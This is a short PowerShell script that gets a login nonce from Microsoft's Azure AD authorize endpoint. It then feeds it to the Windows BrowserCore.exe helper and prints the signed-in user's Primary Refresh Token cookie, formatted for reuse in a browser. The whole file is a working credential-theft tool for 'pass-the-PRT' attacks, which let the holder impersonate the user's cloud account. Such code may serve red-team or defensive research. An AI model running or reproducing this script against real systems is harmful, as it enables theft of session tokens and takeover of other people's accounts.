Function Get-PRT-CookieNonce() {

    $headers = @{
        "User-Agent" = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)"
        "UA-CPU" = "AMD64"
        "Accept-Language" = "en"
    }

    $parameters = @{
        "resource" = "https://graph.windows.net/"
        "client_id" = New-Guid
        "response_type" = "code"
        "haschrome" = "1"
        "redirect_uri" = "urn:ietf:wg:oauth:2.0:oob"
        "client-request-id" = New-Guid
        "x-client-OS" = "Microsoft Windows NT 10.0.19569.0"
        "site_id" = Get-Random
        "mscrid" = New-Guid
    }

    $url = "https://login.microsoftonline.com/Common/oauth2/authorize"
    
    $r = Invoke-WebRequest -Method 'Get' -Uri $url -Headers $headers -Body $parameters

    $content = $r.Content
    $start = $content.indexof('$Config=') + 8
    $end = $content.indexof('//]]></script>') - 3

    $json = -join $content[$start..$end] | ConvertFrom-Json

    return $json.bsso.nonce
}



Function Get-RefreshToken($nonce) {

	$body = "{""method"":""GetCookies"",""uri"":""https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce"",""sender"":""https://login.microsoftonline.com""}"
	$bodyLength = $body.Length
	$bytes = [System.BitConverter]::GetBytes($bodyLength)

	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
	$startInfo.FileName = "C:\Program Files\Windows Security\BrowserCore\BrowserCore.exe"
	$startInfo.RedirectStandardInput = $true
	$startInfo.RedirectStandardError = $true
	$startInfo.RedirectStandardOutput = $true
	$startInfo.UseShellExecute = $false

	$p = New-Object System.Diagnostics.Process
	$p.StartInfo = $startInfo
	$p.Start() | Out-Null

	$writer = $p.StandardInput
	$writer.BaseStream.Write($bytes, 0 , 4)
	$writer.Write($body)

	$writer.Close()

	$p.WaitForExit()

	$stdout = $p.StandardOutput.ReadToEnd()
	$stderr = $p.StandardError.ReadToEnd()

    $start = $stdout.indexof('{')
    $end = $stdout.Length

    $json = -join $stdout[$start..$end] | ConvertFrom-Json
    
    write-host
    write-host 'https://login.microsoftonline.com/login.srf'
    write-host
    write-host "$($json.response.name) = $($json.response.data); HttpOnly; secure"
}



$nonce = Get-PRT-CookieNonce
Get-RefreshToken $nonce
